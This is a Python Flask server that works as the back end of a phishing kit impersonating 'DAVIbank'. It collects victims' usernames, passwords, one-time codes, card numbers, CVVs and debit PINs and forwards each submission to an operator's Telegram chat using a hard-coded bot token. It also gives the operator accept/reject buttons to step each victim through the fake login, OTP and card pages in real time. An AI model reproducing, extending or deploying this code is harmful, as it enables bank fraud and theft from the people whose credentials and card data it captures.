from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from datetime import datetime
import threading
import time

BOT_TOKEN = '8144392743:AAF0qG5TnvlhYcGZdlz7f3rwLpMBw3rXvqQ'
ADMIN_CHAT_ID = '-1003981007597'
PORT = 3000

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# Store user data
# Structure: user_id -> {'username': str, 'password': str, 'otp': str, 
#                        'login_status': 'pending'/'accepted'/'rejected',
#                        'otp_status': 'pending'/'accepted'/'rejected',
#                        'card_status': 'pending'/'accepted'/'rejected'}
user_data = {}
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
last_update_id = 0

# ============ API ENDPOINTS ============

@app.route('/api/submit-login', methods=['POST', 'OPTIONS'])
def submit_login():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    user_id = data.get('userId')
    username = data.get('username')
    password = data.get('password')
    
    print(f"[{datetime.now()}] 📥 Login: {user_id} - {username}")
    
    user_data[user_id] = {
        'username': username,
        'password': password,
        'login_status': 'pending',
        'otp_status': 'pending',
        'card_status': 'pending',
        'timestamp': datetime.now().isoformat()
    }
    
    # Create inline keyboard with ACCEPT and REJECT buttons
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ ACEPTAR LOGIN", "callback_data": f"accept_login_{user_id}"},
                {"text": "❌ RECHAZAR LOGIN", "callback_data": f"reject_login_{user_id}"}
            ]
        ]
    }
    
    message = (f"🔐 **NUEVO LOGIN** 🔐\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"🆔 ID: `{user_id}`\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"👤 Usuario: {username}\n"
               f"🔑 Contraseña: {password}\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"⏰ Hora: {datetime.now().strftime('%H:%M:%S')}\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"⚠️ **ACEPTAR** = Usuario ve OTP page\n"
               f"❌ **RECHAZAR** = Usuario ve mensaje de error")
    
    requests.post(f"{TELEGRAM_API}/sendMessage",
        json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown", "reply_markup": keyboard})
    
    return jsonify({"success": True})

@app.route('/api/submit-otp', methods=['POST', 'OPTIONS'])
def submit_otp():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    user_id = data.get('userId')
    user_otp = data.get('otp')
    
    print(f"[{datetime.now()}] 🔢 OTP submitted: {user_id} - {user_otp}")
    
    if user_id in user_data:
        user_data[user_id]['otp'] = user_otp
        
        # Create inline keyboard with ACCEPT and REJECT buttons for OTP
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "✅ ACEPTAR OTP", "callback_data": f"accept_otp_{user_id}"},
                    {"text": "❌ RECHAZAR OTP", "callback_data": f"reject_otp_{user_id}"}
                ]
            ]
        }
        
        message = (f"🔢 **CÓDIGO OTP RECIBIDO** 🔢\n\n"
                   f"━━━━━━━━━━━━━━━━━━━━━━\n"
                   f"🆔 ID: `{user_id}`\n"
                   f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                   f"👤 Usuario: {user_data[user_id]['username']}\n"
                   f"🔢 Código OTP: `{user_otp}`\n\n"
                   f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                   f"⚠️ **ACEPTAR** = Usuario ve CC page\n"
                   f"❌ **RECHAZAR** = Usuario ve error en OTP page")
        
        requests.post(f"{TELEGRAM_API}/sendMessage",
            json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown", "reply_markup": keyboard})
    
    return jsonify({"success": True})

@app.route('/api/card', methods=['POST', 'OPTIONS'])
def submit_card():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    user_id = data.get('userId')
    
    # Create inline keyboard with ACCEPT and REJECT buttons for card
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ ACEPTAR TARJETA", "callback_data": f"accept_card_{user_id}"},
                {"text": "❌ RECHAZAR TARJETA", "callback_data": f"reject_card_{user_id}"}
            ]
        ]
    }
    
    message = (f"💳 **DATOS DE TARJETA** 💳\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"🆔 ID: `{user_id}`\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"👤 Usuario: {data.get('username')}\n"
               f"🔑 Contraseña: {data.get('password')}\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"💳 Tarjeta: {data.get('cardNumber')}\n"
               f"📅 Expira: {data.get('expiry')}\n"
               f"🔐 CVV: {data.get('cvv')}\n"
               f"🏧 PIN: {data.get('debitPin')}\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"⏰ Hora: {datetime.now().strftime('%H:%M:%S')}\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"⚠️ **ACEPTAR** = Usuario es redirigido al banco\n"
               f"❌ **RECHAZAR** = Usuario ve error en CC page")
    
    requests.post(f"{TELEGRAM_API}/sendMessage",
        json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown", "reply_markup": keyboard})
    
    return jsonify({"success": True})

@app.route('/api/check-login/<user_id>', methods=['GET', 'OPTIONS'])
def check_login(user_id):
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    if user_id in user_data:
        return jsonify({"status": user_data[user_id].get('login_status', 'pending')})
    return jsonify({"status": "pending"})

@app.route('/api/check-otp/<user_id>', methods=['GET', 'OPTIONS'])
def check_otp(user_id):
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    if user_id in user_data:
        return jsonify({"status": user_data[user_id].get('otp_status', 'pending')})
    return jsonify({"status": "pending"})

@app.route('/api/check-card/<user_id>', methods=['GET', 'OPTIONS'])
def check_card(user_id):
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    if user_id in user_data:
        return jsonify({"status": user_data[user_id].get('card_status', 'pending')})
    return jsonify({"status": "pending"})

@app.route('/health', methods=['GET', 'OPTIONS'])
def health():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    return jsonify({"status": "ok", "users": len(user_data)})

# ============ TELEGRAM POLLING ============

def poll_telegram():
    global last_update_id
    while True:
        try:
            url = f"{TELEGRAM_API}/getUpdates"
            params = {"timeout": 30}
            if last_update_id:
                params["offset"] = last_update_id + 1
            
            response = requests.get(url, params=params, timeout=35)
            updates = response.json()
            
            if updates.get('ok') and updates.get('result'):
                for update in updates['result']:
                    last_update_id = update['update_id']
                    
                    if 'callback_query' in update:
                        callback = update['callback_query']
                        data = callback['data']
                        
                        # Handle LOGIN decisions
                        if data.startswith('accept_login_'):
                            user_id = data.replace('accept_login_', '')
                            if user_id in user_data:
                                user_data[user_id]['login_status'] = 'accepted'
                                print(f"[{datetime.now()}] ✅ Login ACCEPTED: {user_id}")
                                requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
                                    json={"callback_query_id": callback['id'], "text": "✅ Login aceptado! Usuario verá OTP page"})
                        
                        elif data.startswith('reject_login_'):
                            user_id = data.replace('reject_login_', '')
                            if user_id in user_data:
                                user_data[user_id]['login_status'] = 'rejected'
                                print(f"[{datetime.now()}] ❌ Login REJECTED: {user_id}")
                                requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
                                    json={"callback_query_id": callback['id'], "text": "❌ Login rechazado! Usuario verá error"})
                        
                        # Handle OTP decisions
                        elif data.startswith('accept_otp_'):
                            user_id = data.replace('accept_otp_', '')
                            if user_id in user_data:
                                user_data[user_id]['otp_status'] = 'accepted'
                                print(f"[{datetime.now()}] ✅ OTP ACCEPTED: {user_id}")
                                requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
                                    json={"callback_query_id": callback['id'], "text": "✅ OTP aceptado! Usuario verá CC page"})
                        
                        elif data.startswith('reject_otp_'):
                            user_id = data.replace('reject_otp_', '')
                            if user_id in user_data:
                                user_data[user_id]['otp_status'] = 'rejected'
                                print(f"[{datetime.now()}] ❌ OTP REJECTED: {user_id}")
                                requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
                                    json={"callback_query_id": callback['id'], "text": "❌ OTP rechazado! Usuario verá error"})
                        
                        # Handle CARD decisions
                        elif data.startswith('accept_card_'):
                            user_id = data.replace('accept_card_', '')
                            if user_id in user_data:
                                user_data[user_id]['card_status'] = 'accepted'
                                print(f"[{datetime.now()}] ✅ Card ACCEPTED: {user_id}")
                                requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
                                    json={"callback_query_id": callback['id'], "text": "✅ Tarjeta aceptada! Usuario será redirigido"})
                        
                        elif data.startswith('reject_card_'):
                            user_id = data.replace('reject_card_', '')
                            if user_id in user_data:
                                user_data[user_id]['card_status'] = 'rejected'
                                print(f"[{datetime.now()}] ❌ Card REJECTED: {user_id}")
                                requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
                                    json={"callback_query_id": callback['id'], "text": "❌ Tarjeta rechazada! Usuario verá error"})
                    
                    if 'message' in update:
                        message = update['message']
                        chat_id = message['chat']['id']
                        text = message.get('text', '')
                        
                        if text == '/start':
                            welcome = ("🤖 Bot de validación DAVIbank\n\n"
                                      "**Flujo de 3 pasos con Aceptar/Rechazar:**\n\n"
                                      "1️⃣ **LOGIN** - Recibe usuario/contraseña\n"
                                      "   ✅ ACEPTAR → Usuario ve OTP page\n"
                                      "   ❌ RECHAZAR → Usuario ve error\n\n"
                                      "2️⃣ **OTP** - Recibe código de 6 dígitos\n"
                                      "   ✅ ACEPTAR → Usuario ve CC page\n"
                                      "   ❌ RECHAZAR → Usuario ve error\n\n"
                                      "3️⃣ **TARJETA** - Recibe datos de tarjeta\n"
                                      "   ✅ ACEPTAR → Usuario redirigido al banco\n"
                                      "   ❌ RECHAZAR → Usuario ve error\n\n"
                                      "📊 Comando: /status - Ver estado")
                            requests.post(f"{TELEGRAM_API}/sendMessage",
                                json={"chat_id": chat_id, "text": welcome, "parse_mode": "Markdown"})
                        
                        elif text == '/status':
                            stats = f"📊 **Estado del Bot**\n\nUsuarios activos: {len(user_data)}"
                            requests.post(f"{TELEGRAM_API}/sendMessage",
                                json={"chat_id": chat_id, "text": stats, "parse_mode": "Markdown"})
        
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1)

if __name__ == '__main__':
    print("\n" + "="*50)
    print("DAVIbank Bot Starting with Accept/Reject Buttons")
    print("="*50)
    print("Flow:")
    print("1. Login → Accept/Reject")
    print("2. OTP → Accept/Reject")
    print("3. Card → Accept/Reject")
    print("="*50 + "\n")
    
    poll_thread = threading.Thread(target=poll_telegram, daemon=True)
    poll_thread.start()
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
